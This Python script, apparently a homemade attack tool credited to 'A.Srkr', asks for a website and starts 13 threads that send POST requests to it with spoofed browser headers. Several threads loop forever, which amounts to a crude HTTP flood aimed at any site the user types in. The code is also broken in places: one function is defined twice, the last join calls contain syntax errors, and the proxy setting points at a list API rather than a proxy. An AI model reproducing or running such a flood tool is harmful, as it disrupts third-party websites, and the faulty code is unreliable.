import threading, time, os, sys, requests
from colorama import *

init(autoreset=True)

def logo():
	mylogo = print(f"""

  {Fore.YELLOW}
 ________   ______     ________  _________  ______    ________   ______   ________       
/_______/\ /_____/\   /_______/\/________/\/_____/\  /_______/\ /_____/\ /_______/\      
\::: _  \ \\:::_ \ \  \__.::._\/\__.::.__\/\:::_ \ \ \::: _  \ \\::::_\/_\::: _  \ \     
 \::(_)  \ \\:(_) ) )_   \::\ \    \::\ \   \:(_) ) )_\::(_)  \ \\:\/___/\\::(_)  \ \    
  \:: __  \ \\: __ `\ \  _\::\ \__  \::\ \   \: __ `\ \\:: __  \ \\_::._\:\\:: __  \ \   
   \:.\ \  \ \\ \ `\ \ \/__\::\__/\  \::\ \   \ \ `\ \ \\:.\ \  \ \ /____\:\\:.\ \  \ \  
    \__\/\__\/ \_\/ \_\/\________\/   \__\/    \_\/ \_\/ \__\/\__\/ \_____\/ \__\/\__\/  
                                                                                       
 {Style.BRIGHT} {Fore.RED}<[<[Coded by A.Srkr]>]>{Fore.RED} 

""")









def req1(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
  





def req2(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    while True:
    	response = requests.post(url, headers=headers, proxies=proxies)
    	
    	if response.status_code == 200:
    		print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    	
    	elif response.status_code == 404:
    		print(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")
    		continue 
  
   

          
def req3(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
   
    while True:
     	response = requests.post(url, headers=headers, proxies=proxies)
     	
     	if response.status_code == 200:
     		print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
     	
     	elif response.status_code == 404:
     	  print(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")
     	  continue 


          
def req4(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
   
    while True:
     	response = requests.post(url, headers=headers, proxies=proxies)
     	
     	if response.status_code == 200:
     		print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
     	
     	elif response.status_code == 404:
     	  print(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")
     	  continue 

def req6(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
        
def req7(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
        
def req8(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
                                            

def req7(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
        
def req10(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
                                            

def req12(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
        
def req11(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
                                            


def req13(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
        
def req9(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
    
    response = requests.post(url, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
    	print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
    elif response.status_code == 404:
        
        return(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")  
                                            


def req5(link):
    url = f"https://{link}"
    headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
   'Referer':f'https://{link}'


}

    proxies = {
        'http': f'https://www.proxy-list.download/api/v1/get?type=socks5',
    
        
    }
   
    while True:
     	response = requests.post(url, headers=headers, proxies=proxies)
     	
     	if response.status_code == 200:
     		print(f"<¥> {Fore.GREEN} {Style.BRIGHT}Successfully Reported [{link}] !")
     	
     	elif response.status_code == 404:
     	  print(f"{Fore.RED} [!] Failed to ping {link}.{Fore.BLUE} Trying again.")
     	  continue 
        	
def main():
    os.system('clear')
    logo()
    
    while True:
    	x = input("Enter webside :[ ")
    	
    	if  ".com" in x  or  ".in" in x:
            break
    		    
    	else:
    		os.system('clear')
    		logo()
    		continue
   
   
    while True:
    	y = input("Do you wanna continue [Y/n] :")
    	if y == "Y" or y == "Y" or y == "":
    		break
    		
    	elif y == "n" or y == "N":
    		sys.exit()
    		
    	else:
    		os.system('clear')
    		logo()
    		continue		
    		
    t1 = threading.Thread(target=req1, args=(x,))
    t2 = threading.Thread(target=req2, args=(x,))    		
    t3 = threading.Thread(target=req3, args=(x,))
    t4 = threading.Thread(target=req4, args=(x,))
    t5 = threading.Thread(target=req5, args=(x,))
    t6 = threading.Thread(target=req6, args=(x,))
    t7 = threading.Thread(target=req7, args=(x,))
    t8 = threading.Thread(target=req8, args=(x,))
    t9 = threading.Thread(target=req9, args=(x,))
    t10 = threading.Thread(target=req10, args=(x,))
    t11 = threading.Thread(target=req11, args=(x,))
    t12 = threading.Thread(target=req12, args=(x,))
    t13 = threading.Thread(target=req13, args=(x,))
    
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()
    t11.start()
    t12.start()
    t13.start()
    
    
    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()
    t7.join()
    t8.join()
    t9.join()
    t10.join()
    t11.join()
    t.12.join()
    t.13.joim()
    
    
     		    	    	    
    		    
    
 








if __name__ == '__main__':
	main()                                                                       
